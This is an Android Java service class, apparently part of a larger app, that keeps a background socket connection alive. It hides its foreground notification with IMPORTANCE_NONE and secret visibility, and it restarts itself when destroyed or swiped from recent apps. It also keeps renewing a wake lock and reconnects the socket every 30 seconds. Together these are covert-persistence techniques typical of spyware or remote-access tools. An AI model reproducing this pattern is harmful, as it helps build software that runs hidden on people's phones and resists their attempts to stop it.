package com.example.myapplication.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.WindowManager;
import android.app.KeyguardManager;

import androidx.core.app.NotificationCompat;

import com.example.myapplication.utils.SocketManager;

public class PersistentService extends Service {
    private static final String TAG = "PersistentService";
    private static final String CHANNEL_ID = "PersistentChannel";
    private static final int NOTIFICATION_ID = 2001;
    
    private Handler keepAliveHandler;
    private PowerManager.WakeLock wakeLock;
    private PowerManager.WakeLock screenWakeLock;
    private PowerManager.WakeLock cpuWakeLock;
    private boolean isRunning = false;
    
    // Keep alive interval (check every 30 seconds)
    private static final long KEEP_ALIVE_INTERVAL = 30000;
    
    @Override
    public void onCreate() {
        super.onCreate();
        createInvisibleNotificationChannel();
        acquireWakeLock();
        startKeepAliveHandler();
        Log.d(TAG, "Persistent service created");
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isRunning) {
            startForeground(NOTIFICATION_ID, createInvisibleNotification());
            isRunning = true;
            
            // Initialize socket connection
            initializeApp();
            
            Log.d(TAG, "Persistent service started");
        }
        
        // Return START_STICKY to automatically restart if killed
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        isRunning = false;
        
        // Release only existing wake locks
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                Log.d(TAG, "Main wake lock released");
            }
            // Don't try to release wake locks that don't exist
        } catch (Exception e) {
            Log.e(TAG, "Error releasing wake locks", e);
        }
        
        // Stop keep alive handler
        if (keepAliveHandler != null) {
            keepAliveHandler.removeCallbacksAndMessages(null);
        }
        
        // Restart the service after a short delay
        restartService();
        
        Log.d(TAG, "Persistent service destroyed - restarting");
        super.onDestroy();
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // Called when app is removed from recent apps
        Log.d(TAG, "App removed from recent apps - keeping service alive");
        
        // Restart the service to keep it alive
        restartService();
        
        super.onTaskRemoved(rootIntent);
    }
    
    private void createInvisibleNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                // Validate channel ID is not null or empty
                if (CHANNEL_ID == null || CHANNEL_ID.trim().isEmpty()) {
                    Log.e(TAG, "Channel ID cannot be null or empty");
                    return;
                }
                
                NotificationChannel channel = new NotificationChannel(
                        CHANNEL_ID,
                        "Background Service", // Valid channel name (cannot be empty)
                        NotificationManager.IMPORTANCE_NONE);
                        
                // Set valid description (cannot be null)
                channel.setDescription("Maintains app functionality in background");
                channel.setSound(null, null);
                channel.enableVibration(false);
                channel.enableLights(false);
                channel.setShowBadge(false);
                channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                
                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    // Check if channel already exists to avoid recreation
                    NotificationChannel existingChannel = manager.getNotificationChannel(CHANNEL_ID);
                    if (existingChannel == null) {
                        manager.createNotificationChannel(channel);
                        Log.d(TAG, "Notification channel created successfully");
                    } else {
                        Log.d(TAG, "Notification channel already exists");
                    }
                } else {
                    Log.e(TAG, "NotificationManager is null");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error creating notification channel", e);
            }
        }
    }
    
    private Notification createInvisibleNotification() {
        try {
            // Use a valid icon resource from Android system
            int iconResId = android.R.drawable.ic_dialog_info;
            
            return new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("Background Service") // Valid title (cannot be empty)
                    .setContentText("Running in background") // Valid text (cannot be empty)
                    .setSmallIcon(iconResId) // Valid icon resource
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setOngoing(false)
                    .setAutoCancel(true)
                    .setShowWhen(false)
                    .setSound(null)
                    .setVibrate(null)
                    .setLights(0, 0, 0)
                    .setCategory(NotificationCompat.CATEGORY_SERVICE)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                    .build();
        } catch (Exception e) {
            Log.e(TAG, "Error creating notification", e);
            // Fallback to a simpler notification
            return new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("Service")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .build();
        }
    }
    
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager != null) {
                // Only acquire the essential wake lock to prevent crashes
                try {
                    wakeLock = powerManager.newWakeLock(
                            PowerManager.PARTIAL_WAKE_LOCK,
                            "MyApp:PersistentService");
                    
                    // Set a timeout to prevent indefinite holding
                    wakeLock.acquire(10*60*1000L /*10 minutes*/);
                    Log.d(TAG, "Main wake lock acquired successfully");
                    
                } catch (SecurityException e) {
                    Log.e(TAG, "Wake lock permission denied - continuing without wake lock", e);
                    wakeLock = null;
                } catch (Exception e) {
                    Log.e(TAG, "Error acquiring main wake lock", e);
                    wakeLock = null;
                }
                
                // Don't acquire additional wake locks that might cause issues
                Log.d(TAG, "Wake lock acquisition completed");
            } else {
                Log.e(TAG, "PowerManager is null");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in wake lock acquisition process", e);
        }
    }
    
    private void startKeepAliveHandler() {
        keepAliveHandler = new Handler(Looper.getMainLooper());
        keepAliveHandler.post(keepAliveRunnable);
    }
    
    private final Runnable keepAliveRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                // Check and maintain socket connection
                maintainConnections();
                
                // Renew wake lock if needed
                renewWakeLock();
                
                // Schedule next check
                keepAliveHandler.postDelayed(this, KEEP_ALIVE_INTERVAL);
            }
        }
    };
    
    private void maintainConnections() {
        try {
            // Check socket connection
            if (!SocketManager.getInstance().isConnected()) {
                Log.d(TAG, "Socket disconnected, reconnecting...");
                SocketManager.getInstance().initialize();
            }
            
            // Log keep alive
            Log.d(TAG, "Keep alive check completed");
            
        } catch (Exception e) {
            Log.e(TAG, "Error in keep alive check", e);
        }
    }
    
    private void renewWakeLock() {
        try {
            // Only renew the main wake lock if it exists and needs renewal
            if (wakeLock != null && !wakeLock.isHeld()) {
                try {
                    wakeLock.acquire(10*60*1000L /*10 minutes*/);
                    Log.d(TAG, "Main wake lock renewed");
                } catch (SecurityException e) {
                    Log.e(TAG, "Wake lock permission denied during renewal", e);
                    wakeLock = null; // Don't try again
                } catch (Exception e) {
                    Log.e(TAG, "Error renewing main wake lock", e);
                }
            }
            
            // Don't renew additional wake locks that don't exist
            
        } catch (Exception e) {
            Log.e(TAG, "Error in wake lock renewal process", e);
        }
    }
    
    private void restartService() {
        try {
            // Use a handler to restart after a delay
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    Intent restartIntent = new Intent(getApplicationContext(), PersistentService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(restartIntent);
                    } else {
                        startService(restartIntent);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error restarting service", e);
                }
            }, 1000); // 1 second delay
            
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling service restart", e);
        }
    }
    
    private void initializeApp() {
        try {
            // Initialize socket manager
            SocketManager.getInstance().initialize();
            
            Log.d(TAG, "App components initialized");
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing app components", e);
        }
    }
    
    // Public method to check if service is running
    public static boolean isRunning() {
        // This can be called from other components to check service status
        return true; // Service should always be running
    }
}
